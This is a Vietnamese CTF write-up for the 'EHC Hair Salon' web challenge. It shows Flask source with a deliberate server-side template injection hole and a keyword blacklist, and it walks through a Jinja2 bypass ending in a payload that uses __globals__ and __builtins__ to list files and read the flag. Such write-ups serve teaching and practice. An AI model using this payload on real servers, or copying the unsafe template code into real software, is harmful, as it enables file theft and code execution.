'''
title: FTPU Hacking CTF | Web Writeup | EHC Hair Salon
date: 2022-06-29 14h00 +0700
'''

# FPTU Hacking CTF 2022

## Web exploitation: EHC Hair Salon

> Thực ra bài này trong giải thì team K14LH của tôi không có làm được vì ... Covid nên hơi oải (－_－) zzZ

### 🧾 Source code

```python=
import re
from flask import Flask, render_template_string, request

app = Flask(__name__)
regex = "request|config|self|class|flag|0|1|2|3|4|5|6|7|8|9|\"|\'|\\|\~|\%|\#"

error_page = '''
        {% extends "layout.html" %}
        {% block body %}
        <center>
           <section class="section">
              <div class="container">
                 <h1 class="title">Ông cháu à!</h1>
                 <p>Ông chú chỉ cắt được quả đầu Tommy Xiaomi thôi!</p>
              </div>
           </section>
        </center>
        {% endblock %}
        '''

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        if not request.form['hair']:
            return render_template_string(error_page)

        if len(request.form) > 1:
            return render_template_string(error_page)

        hair_type = request.form['hair'].lower()
        if '{' in hair_type and re.search(regex,hair_type):
            return render_template_string(error_page)

        if len(hair_type) > 256:
            return render_template_string(error_page)

        page = \
            '''
        {{% extends "layout.html" %}}
        {{% block body %}}
        <center>
           <section class="section">
              <div class="container">
                 <h1 class="title">Dậy đi ông cháu ơi, cắt xong rồi nhé!</h1>
                 <ul class=flashes>
                    <label>Ông cháu có quả đầu {} thanh toán tiền cho chú nào <3</label>
                 </ul>
                 </br>
              </div>
           </section>
           <iframe width="560" height="315" src="https://v16m-webapp.tiktokcdn-us.com/2f678d478e2de26a048aaf4f3ed6d8bd/62b6f7f3/video/tos/useast2a/tos-useast2a-pve-0037-aiso/dd6e434a38e4447e83f61a684c31583b/?a=1988&ch=0&cr=0&dr=0&lr=tiktok&cd=0%7C0%7C0%7C0&br=1302&bt=651&cs=0&ds=1&ft=ebtHKHk_Myq8Z4IeUwe2NsE~fl7Gb&mime_type=video_mp4&qs=0&rc=ZThoZWk7Zzw3PGQ1NmVnM0BpM3VsZWg6ZjhzZDMzZjgzM0AzLjIyYC8tX2AxYGFhMjVhYSNnMS9kcjQwMC1gLS1kL2Nzcw%3D%3D&l=202206250556040100040040250040050060030180F0D3C2C" frameborder="0" allowfullscreen></iframe>
      </iframe>
        </center>
        {{% endblock %}}
        '''.format(hair_type)

    elif request.method == 'GET':
        page = \
            '''
        {% extends "layout.html" %}
        {% block body %}
        <center>
            <section class="section">
              <div class="container">
                 <h1 class="title">Chào mừng đến với <a href="https://www.facebook.com/ehc.fptu">EHC Hair Salon</a>, hôm nay ông cháu này muốn cắt quả đầu nào nhể?</h1>
                 <p>Nhập tên quả đầu mà ông cháu muốn cắt nha!</p>
                 <form action='/' method='POST' align='center'>
                    <p><input name='hair' style='text-align: center;' type='text' placeholder='Tommy Xiaomi' /></p>
                    <p><input value='Submit' style='text-align: center;' type='submit' /></p>
                 </form>
              </div>
           </section>
        </center>
        {% endblock %}
        '''
    return render_template_string(page)

app.run('0.0.0.0', 8000)
```

### 🔎 Analysis

Thứ nhất, ta biết đây là một SSTI challenge thông qua dòng 37-55.

Blacklist tại dòng 5.

Từ dòng 23-35, ta biết là ngoài việc phải bypass được blacklist, payload của chúng ta còn phải <= 256 kí tự.

Thông qua bài viết [này](https://chowdera.com/2020/12/20201221231521371q.html), tôi biết đến `lipsum`, một fuction gen ra đoạn văn mẫu huyền thoại của HTML: ***"Lorem ipsum"***

![](https://i.imgur.com/lNiclIJ.png)

May là không filter `_`, nên chúng ta hoàn toàn có thể gọi một số từ khoá như `__globals__` hay `__builtins__`:

![](https://i.imgur.com/SrPkQea.png)

Tôi để ý đến `os`, ta có thể gọi module này cho việc list file (vì hiện tại cũng chưa biết file flag nằm ở đâu, tên gì):

![](https://i.imgur.com/sva6jHW.png)

Trong list trả về lại thấy có file `flag`, đã vậy còn vừa hay nằm ở cuối list, sử dụng hàm `pop()` để lấy phần tử cuối này:

![](https://i.imgur.com/5TtMMTY.png)

Quay lại cái lúc thử `lipsum.__globals__`, tôi thấy có `open`, ban đầu tính dùng nó để gọi flag, nhưng khi gọi `lipsum.__globals__.open` thì có vẻ như không được như mong muốn:

![](https://i.imgur.com/S56heXc.png)

Đành tìm payload khác vậy, có một function khác, giống với `lipsum`, cũng đi kèm với Jinja2, `get_flashed_messages`:

![](https://i.imgur.com/l7zBVX5.png)

Chúng ta có thể gọi hàm `open` thông qua `get_flashed_messages` như sau:

![](https://i.imgur.com/X8SlCdM.png)

Như vậy, ta có payload cuối cùng:

```python 
{{ get_flashed_messages.__globals__.__builtins__.open(lipsum.__globals__.os.listdir().pop()).readline() }}
```

![](https://i.imgur.com/qGGMt9P.png)

Flag: `FPTUHacking{d4y_d1_0ng_ch4u_0i,ban_da_thoat_khoi_EHC_hair_salon_roi}`

> Hơi tiếc, vì chỉ mất 30p là làm ra bài này rồi, mà hôm giải đang diễn ra thì cả team lại oải vì Covid quá nên đi ngủ hết cả (︶︹︺)
> Cảm ơn 0ni0n team vì dù có chút sự cố trong quá trình deploy và phải code vội challenge, nhưng ra được những đề chất lượng. Shout out to 0ni0n! 
